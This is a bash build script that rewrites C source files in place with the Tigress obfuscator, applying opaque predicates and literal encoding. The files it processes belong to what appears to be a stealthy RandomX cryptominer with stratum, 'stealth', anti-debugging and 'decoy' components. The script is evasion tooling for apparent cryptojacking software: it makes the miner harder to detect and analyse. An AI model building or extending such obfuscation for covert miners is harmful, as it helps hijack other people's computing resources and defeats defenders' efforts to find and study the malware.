#!/usr/bin/env bash
set -euo pipefail
ROOT="$(pwd)"
TIGRESS="${TIGRESS:-/usr/local/bin/tigress}"
DEFS="-D_POSIX_C_SOURCE=199309L -D_GNU_SOURCE -DFEATURE_TLS=1 -DFEATURE_WS=1 -DFEATURE_FULL_MEM=1 -DFEATURE_JIT=1 -DFEATURE_HARD_AES=1 -DFEATURE_LARGE_PAGES=0 -DFEATURE_VERBOSE=1 -DFEATURE_COLORS=1 -DFEATURE_KEEPALIVE=1"
INCS="-I$ROOT/src -I$ROOT/libs/libutils/include -I$ROOT/libs/libcrypto/include -I$ROOT/libs/libantidebug/include -I$ROOT/libs/libjson/include -I$ROOT/libs/libws/include -I$ROOT/libs/libstratum/include -I$ROOT/libs/libminer/include -I$ROOT/libs/libdecoy/include -I$ROOT/lib/randomx/src"
TARGETS="src/main.c src/stealth.c libs/libcrypto/src/auth_key.c libs/libcrypto/src/auth_key_data.c libs/libcrypto/src/decoys.c libs/libantidebug/src/antidebug.c libs/libdecoy/src/decoy.c libs/libutils/src/hex.c libs/libutils/src/cpu.c"
for f in $TARGETS; do
  echo "==> $f"
  tmp="$f.tigsrc.c"
  out="$f.tigout.c"
  cat > "$tmp" << 'HDR'
#define _POSIX_C_SOURCE 199309L
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
HDR
  cat "$f" >> "$tmp"
  has_main=0
  if grep -qE '\bmain[[:space:]]*\(' "$f"; then has_main=1; else printf '\nint main(void){return 0;}\n' >> "$tmp"; fi
  if [ "$has_main" = "1" ]; then
    INIT=main
  else
    INIT=$(perl -lne 'if(/^[a-zA-Z_][\w\s\*\(\)]*\b([a-zA-Z_]\w*)\s*\([^;]*\)\s*\{/){$n=$1; next if $n=~/^(if|for|while|switch|sizeof)$/; print $n; exit}' "$f")
  fi
  if [ -z "$INIT" ]; then echo "SKIP $f (no func)"; rm -f "$tmp"; continue; fi
  if ! $TIGRESS --Seed=1 --Environment=x86_64:Linux:Gcc:4.6 $DEFS $INCS \
    --Transform=InitEntropy --Functions="$INIT" \
    --Transform=InitOpaque --Functions="$INIT" \
    --Transform=AddOpaque --Functions=* --AddOpaqueKinds=call --AddOpaqueCount=1 \
    --Transform=EncodeLiterals --Functions=* \
    --out="$out" "$tmp"; then
    echo "FAIL $f"; rm -f "$tmp" "$out"; continue
  fi
  if [ "$has_main" = "0" ]; then
    perl -0pi -e 's/int main\(int _TIG_IZ_vGt1_formal_argc[^\n]*;\n//g; s/\/\* BEGIN FUNCTION-DEF main .*?\/\* END FUNCTION-DEF main [^\n]*\n//s' "$out"
  fi
  base=$(basename "$f" .c | tr '.-' '__')
  perl -pi -e "s/\bentropyThread\b/entropyThread_${base}/g" "$out"
  mv "$out" "$f"
  rm -f "$tmp"
  echo "OK $f"
done
